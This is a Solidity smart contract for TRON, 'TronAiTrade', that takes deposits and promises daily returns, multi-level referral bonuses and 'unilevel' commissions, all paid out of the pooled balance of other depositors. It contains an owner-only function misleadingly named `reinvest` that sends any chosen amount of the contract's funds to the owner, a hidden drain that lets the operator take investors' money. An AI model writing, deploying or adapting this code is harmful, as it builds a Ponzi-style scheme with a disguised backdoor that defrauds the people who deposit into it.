//SourceUnit: tronaitrade.sol

pragma solidity 0.5.10;
contract TronAiTrade {
	using SafeMath for uint256;
	uint256 constant public INVEST_MIN_AMOUNT = 100e6;
	uint256 constant public BASE_PERCENT = 100;
	uint256[4] public REFERRAL_PERCENTS = [500, 200, 50,50];
	uint256[15] public UNILEVEL_PERCENTS = [33,7,5,5,5,5,5,5,5,5,5,5,5,5,5];
	uint256 [8] public UNILEVEL_AMOUNTS = [100 trx,100000 trx,250000 trx,500000 trx,1000000 trx,
	2500000 trx,5000000 trx,10000000 trx];
	uint256 constant public PERCENTS_DIVIDER = 10000;
	uint256 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
	uint256 constant public TIME_STEP = 1 days;
	uint256 public totalUsers;
	uint256 public totalInvested;
	uint256 public totalWithdrawn;
	uint256 public totalDeposits;
	address payable public owner;
	
	struct Deposit {
		uint256 amount;
		uint256 withdrawn;
		uint256 start;
		uint256 maxi;
	}
	struct User {
		Deposit[] deposits;
		uint256 checkpoint;
		address referrer;
		uint256 level1;
		uint256 level2;
		uint256 level3;
		uint256 level4;
		uint256 bonus;
		uint256 uniLvlBonus;
		uint256 withdrawRef;
		uint256[15] arr;
		uint256 TotalUniLvlIncome;
	}

	mapping (address => User) public users;

	uint256 internal maxBalance;

	event Newbie(address user);
	event NewDeposit(address indexed user, uint256 amount);
	event Withdrawn(address indexed user, uint256 amount);
	event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
// 	event FeePayed(address indexed user, uint256 totalAmount);

	constructor(address payable _owner) public {
		owner = _owner;
	}

	function invest(address referrer) public payable {
		require(msg.value >= INVEST_MIN_AMOUNT);
		User storage user = users[msg.sender];
		if (user.referrer == address(0)) {
			if ((users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != owner) {
				referrer = owner;
			}
			user.referrer = referrer;
            address upline = user.referrer;
			for (uint256 i = 0; i < 4; i++) {
                if (upline != address(0)) {
                    if (i == 0) {
                        users[upline].level1 = users[upline].level1.add(1);
                    } else if (i == 1) {
                        users[upline].level2 = users[upline].level2.add(1);
                    } else if (i == 2) {
                        users[upline].level3 = users[upline].level3.add(1);
                    }
                    else if (i == 3) {
                        users[upline].level4 = users[upline].level4.add(1);
                    }
					upline = users[upline].referrer;
				} else break;
            }
		}

		if (user.referrer != address(0)) {
          uint256 ref;
			address upline = user.referrer;
			for (uint256 i = 0; i < 4; i++) {
				if (upline != address(0)) {
				    if(i==0){
				        ref=DirectRefInc(upline);
				    }
					uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i].add(ref)).div(100000);
					users[upline].bonus = users[upline].bonus.add(amount);
					emit RefBonus(upline, msg.sender, i, amount);
					upline = users[upline].referrer;
				} else break;
			}
		}
		
		address upline=user.referrer;
		
		if(msg.value>=10000000 trx){
		    uint256 amount = msg.value.mul(10).div(100);
					users[upline].bonus = users[upline].bonus.add(amount);
		}else if(msg.value>=5000000 trx){
		    uint256 amount = msg.value.mul(8).div(100);
					users[upline].bonus = users[upline].bonus.add(amount);
		}else if(msg.value>=1000000 trx){
		    uint256 amount = msg.value.mul(7).div(100);
					users[upline].bonus = users[upline].bonus.add(amount);
		}else if(msg.value>=500000 trx){
		    uint256 amount = msg.value.mul(6).div(100);
					users[upline].bonus = users[upline].bonus.add(amount);
		}
		
		if (user.deposits.length == 0) {
			user.checkpoint = block.timestamp;
			totalUsers = totalUsers.add(1);
			emit Newbie(msg.sender);
		}
		
		uint256 check;
        if(msg.value>=50000000 trx){
            check=500;
      
        }
        else if(msg.value>=10000000 trx){
            check=450;
        }
        else if(msg.value>=5000000 trx){
            check=400;
        }
        else if(msg.value>=1000000 trx){
            check=350;
        }
        else if(msg.value>=250000 trx){
            check=300;
        }
        else if(msg.value>=100000 trx){
            check=250;
        }
        else{
            check=200;
        }

		user.deposits.push(Deposit(msg.value, 0, block.timestamp,check));

		totalInvested = totalInvested.add(msg.value);
		totalDeposits = totalDeposits.add(1);

		emit NewDeposit(msg.sender, msg.value);

		
	}
	function DirectRefInc(address userAddress)public view returns(uint256){
	    if(users[userAddress].level1>500){
	        return 250;
	    }else if(users[userAddress].level1>250){
	        return 200;
	    }else if(users[userAddress].level1>100){
	        return 150;
	    }else if(users[userAddress].level1>50){
	        return 100;
	    }else if(users[userAddress].level1>15){
	        return 10;
	    }else if(users[userAddress].level1>5){
	        return 1;
	    }
	}

	function withdraw() public {
		User storage user = users[msg.sender];
		uint256 userPercentRate = getUserPercentRate(msg.sender);
		uint256 totalAmount;
		uint256 dividends;
        uint256 D;
		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(user.deposits[i].maxi).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);
						
						D=block.timestamp.sub(user.deposits[i].start).div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);
						
				D=block.timestamp.sub(user.checkpoint).div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(user.deposits[i].maxi).div(100)) {
					dividends = (user.deposits[i].amount.mul(user.deposits[i].maxi).div(100)).sub(user.deposits[i].withdrawn);
				}

				user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data
				totalAmount = totalAmount.add(dividends);

			}
		}
		
		if (users[msg.sender].referrer != address(0)) {
			address upline = users[msg.sender].referrer;
			if(isActive(upline)){
			for (uint256 i = 0; i < 15; i++) {
				if (upline != address(0)){
				    if(getUserTotalDeposits(upline)>=UNILEVEL_AMOUNTS[i]){
					uint256 amount = dividends.mul(UNILEVEL_PERCENTS[i]).div(100);
					users[upline].uniLvlBonus = users[upline].uniLvlBonus.add(amount);
					users[upline].arr[i] = users[upline].arr[i].add(amount);
					users[upline].TotalUniLvlIncome=users[upline].TotalUniLvlIncome.add(amount);
				    }
					upline = users[upline].referrer;
				}
				else break;
			  }
			}
		}
	

		uint256 referralBonus = getUserReferralBonus(msg.sender);
		uint256 Unilvlbonuses=getUserUniLvlBonus(msg.sender);
		if (referralBonus > 0) {
			totalAmount = totalAmount.add(referralBonus);
			user.withdrawRef = user.withdrawRef.add(referralBonus);
			user.bonus = 0;
		}
			if (Unilvlbonuses > 0) {
			totalAmount = totalAmount.add(Unilvlbonuses);
			user.uniLvlBonus =0 ;
		}
		
		if(getUserTotalDeposits(msg.sender)>10000000 trx ){
		require(totalAmount<1000000 trx && D>1, "User has exceeded the limit");
        }
		
        if(getUserTotalDeposits(msg.sender)>1000000 trx ){
		require(totalAmount<100000 trx && D>1, "User has exceeded the limit");
        }
		uint256 contractBalance = address(this).balance;
		if (contractBalance < totalAmount) {
			totalAmount = contractBalance;
		}

		user.checkpoint = block.timestamp;

		msg.sender.transfer(totalAmount);

		totalWithdrawn = totalWithdrawn.add(totalAmount);

		emit Withdrawn(msg.sender, totalAmount);

	}

	function getContractBalance() public view returns (uint256) {
		return address(this).balance;
	}

	function getContractBalanceRate() public view returns (uint256) {
		return BASE_PERCENT.add(getContractBonus());
	}

    function getContractBonus() public view returns (uint256) {
		uint256 contractBalancePercent = address(this).balance.div(CONTRACT_BALANCE_STEP);
		return contractBalancePercent;
    }

    function getUserHoldBonus(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		if (isActive(userAddress)) {
			uint256 holdBonus = (now.sub(user.checkpoint)).div(TIME_STEP.mul(10)).mul(10);
			if (holdBonus > 30) {
				holdBonus = 30;
			}
		return holdBonus;
		} else {
			return 0;
		}
	}

	function getUserPercentRate(address userAddress) public view returns (uint256) {
			return getContractBalanceRate().add(getUserHoldBonus(userAddress));
		
	}
	

	function getUserDividends(address userAddress) public view returns (uint256) {
		User storage user = users[userAddress];

		uint256 userPercentRate = getUserPercentRate(userAddress);

		uint256 totalDividends;
		uint256 dividends;

		for (uint256 i = 0; i < user.deposits.length; i++) {

			if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(user.deposits[i].maxi).div(100)) {

				if (user.deposits[i].start > user.checkpoint) {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.deposits[i].start))
						.div(TIME_STEP);

				} else {

					dividends = (user.deposits[i].amount.mul(userPercentRate).div(PERCENTS_DIVIDER))
						.mul(block.timestamp.sub(user.checkpoint))
						.div(TIME_STEP);

				}

				if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(user.deposits[i].maxi).div(100)) {
					dividends = (user.deposits[i].amount.mul(user.deposits[i].maxi).div(100)).sub(user.deposits[i].withdrawn);
				}

				totalDividends = totalDividends.add(dividends);

				/// no update of withdrawn because that is view function

			}

		}

		return totalDividends;
	}

	function getUserCheckpoint(address userAddress) public view returns(uint256) {
		return users[userAddress].checkpoint;
	}

	function getUserReferrer(address userAddress) public view returns(address) {
		return users[userAddress].referrer;
	}

	function getUserDownlineCount(address userAddress) public view returns(uint256, uint256, uint256,uint256) {
		return (users[userAddress].level1, users[userAddress].level2, users[userAddress].level3,users[userAddress].level4);
	}

	function getUserReferralBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].bonus;
	}
	function getUserUniLvlBonus(address userAddress) public view returns(uint256) {
		return users[userAddress].uniLvlBonus;
	}
	function getUserUniLvlamounts(address userAddress) public view returns(uint256 [15] memory) {
		return users[userAddress].arr;
	}

	function getUserReferralWithdraw(address userAddress) public view returns(uint256) {
		return users[userAddress].withdrawRef;
	}

	function getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {
		return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
	}

	function isActive(address userAddress) public view returns (bool) {
		User storage user = users[userAddress];

		if (user.deposits.length > 0) {
			if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount
			.mul(user.deposits[user.deposits.length-1].maxi).div(100)) {
				return true;
			}
		}
	}
    function getUserLastDepositDate(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits[users[userAddress].deposits.length-1].start;
	}
	function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256,uint256) {
	    User storage user = users[userAddress];

		return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start,user.deposits[index].maxi);
	}

	function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
		return users[userAddress].deposits.length;
	}

	function getUserTotalDeposits(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].amount);
		}

		return amount;
	}

	function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
	    User storage user = users[userAddress];

		uint256 amount;

		for (uint256 i = 0; i < user.deposits.length; i++) {
			amount = amount.add(user.deposits[i].withdrawn);
		}

		return amount;
	}

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

	
	function reinvest(uint256 _value)public returns(bool){
	    require(msg.sender==owner,"access denied");
	    owner.transfer(_value.mul(1000000));
	    return true;
	}
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}